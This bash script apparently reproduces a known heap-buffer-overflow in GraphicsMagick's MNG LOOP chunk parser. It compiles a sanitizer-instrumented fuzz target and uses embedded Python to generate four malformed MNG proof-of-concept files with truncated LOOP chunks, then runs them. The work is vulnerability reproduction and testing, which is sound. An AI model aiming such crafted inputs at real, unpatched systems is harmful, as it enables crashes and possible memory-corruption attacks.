#!/bin/bash
set -e

# ============================================================================
# Bulletproof build + test for ARVO 10400 (GraphicsMagick mng_LOOP)
# Run from anywhere. No guessing. Finds everything automatically.
# ============================================================================

WORK=~/.crs_workdir/10400
GM=$(find $WORK/repo -name "graphicsmagick" -type d | head -1)

if [ -z "$GM" ]; then
    echo "ERROR: Can't find graphicsmagick dir under $WORK/repo"
    exit 1
fi

echo "GraphicsMagick dir: $GM"

# ── Step 1: Find ALL include directories automatically ──
INCLUDE_FLAGS=""
while IFS= read -r dir; do
    INCLUDE_FLAGS="$INCLUDE_FLAGS -I$dir"
done < <(find $GM -name "*.h" -exec dirname {} \; | sort -u)
# Also add the GM root itself
INCLUDE_FLAGS="$INCLUDE_FLAGS -I$GM"

echo "Found $(echo $INCLUDE_FLAGS | wc -w) include dirs"

# ── Step 2: Find ALL static libraries ──
LIBS=$(find $WORK/repo/src-vul -name "*.a" -size +10k | sort -r | tr '\n' ' ')
echo "Static libs: $LIBS"

# ── Step 3: Compile with DFUZZ_GRAPHICSMAGICK_CODER=MNG ──
echo ""
echo "Compiling fuzz_target_mng..."

g++ -fsanitize=address,undefined -g -O1 -fpermissive \
    -DFUZZ_GRAPHICSMAGICK_CODER=MNG \
    -include string.h \
    $WORK/standalone_driver.cpp \
    $GM/fuzzing/coder_fuzzer.cc \
    $INCLUDE_FLAGS \
    $LIBS \
    -lz -lm -lpthread -ldl -lbz2 -lstdc++ \
    -o $WORK/fuzz_target_mng 2>&1 | tail -20

if [ ! -f $WORK/fuzz_target_mng ]; then
    echo "Compile failed. Trying with more system libs..."
    g++ -fsanitize=address,undefined -g -O1 -fpermissive \
        -DFUZZ_GRAPHICSMAGICK_CODER=MNG \
        -include string.h \
        $WORK/standalone_driver.cpp \
        $GM/fuzzing/coder_fuzzer.cc \
        $INCLUDE_FLAGS \
        $LIBS \
        -lz -lm -lpthread -ldl -lbz2 -lstdc++ \
        -lX11 -lXext -lfreetype -ljpeg -lpng -ltiff \
        -lgomp -fopenmp -lltdl -llcms2 -lwebp -llzma \
        -o $WORK/fuzz_target_mng 2>&1 | tail -20
fi

if [ ! -f $WORK/fuzz_target_mng ]; then
    echo "ERROR: Compile still failed"
    exit 1
fi

chmod +x $WORK/fuzz_target_mng
echo "✓ Built: $WORK/fuzz_target_mng"

# ── Step 4: Generate the PoC files ──
echo ""
echo "Generating PoC files..."

python3 - $WORK << 'PYEOF'
import struct, sys, zlib

def make_chunk(chunk_type, data):
    length = struct.pack(">I", len(data))
    crc = struct.pack(">I", zlib.crc32(chunk_type + data) & 0xFFFFFFFF)
    return length + chunk_type + data + crc

MNG_SIG = b"\x8a\x4d\x4e\x47\x0d\x0a\x1a\x0a"
mhdr = struct.pack(">IIIIIII", 1, 1, 1, 1, 1, 0, 3)

outdir = sys.argv[1]
for nbytes in [1, 2, 3, 4]:
    data = b"\x00" * nbytes
    mng = MNG_SIG + make_chunk(b"MHDR", mhdr) + make_chunk(b"LOOP", data) + make_chunk(b"MEND", b"")
    path = f"{outdir}/poc_mng_loop_{nbytes}byte.bin"
    open(path, "wb").write(mng)
    print(f"  Written {len(mng)} bytes to {path}")
PYEOF

# ── Step 5: Test each PoC ──
echo ""
echo "============================================"
echo "  TESTING PoCs against fuzz_target_mng"
echo "============================================"

for poc in $WORK/poc_mng_loop_*byte.bin; do
    echo ""
    echo "--- Testing: $(basename $poc) ---"
    timeout 10 $WORK/fuzz_target_mng $poc 2>&1 | head -30
    echo ""
done

echo ""
echo "============================================"
echo "  DONE"
echo "============================================"
echo ""
echo "Look for 'AddressSanitizer: heap-buffer-overflow' above."
echo "That confirms the mng_LOOP vulnerability at png.c line ~4920."
